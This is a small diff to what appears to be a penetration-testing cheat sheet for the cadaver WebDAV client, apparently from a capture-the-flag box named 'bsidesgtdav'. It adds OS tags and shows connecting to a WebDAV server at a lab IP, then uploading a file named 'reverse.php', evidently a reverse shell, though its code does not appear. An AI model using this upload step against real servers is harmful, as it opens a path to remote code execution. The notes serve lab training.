@@ -8,12 +8,14 @@ Used on: **bsidesgtdav**
 
 Connect to a WebDAV server (prompts for credentials if required):
 
+<!-- cmd: linux -->
 ```bash
 cadaver http://10.130.148.83/webdav/
 ```
 
 Upload a file (from within the cadaver interactive shell):
 
+<!-- cmd: linux -->
 ```bash
 dav:/webdav/> put reverse.php
 ```
